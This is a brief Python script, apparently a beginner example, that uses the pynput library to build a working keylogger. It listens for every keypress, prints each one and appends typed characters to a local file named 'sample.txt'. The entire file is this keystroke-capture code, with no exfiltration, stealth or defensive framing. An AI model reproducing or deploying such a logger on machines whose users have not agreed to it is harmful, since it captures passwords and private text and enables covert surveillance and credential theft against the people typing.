from pynput import keyboard # importing keyboard module from pynput package

def keyPressed(key): #keyboard logger
    print(str(key)) 
    with open("sample.txt", 'a') as logkey: 
        try:
           char = key.char
           logkey.write(char)
        except: #if typed character is not readable
            print("Error getting char") 

if __name__=="__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
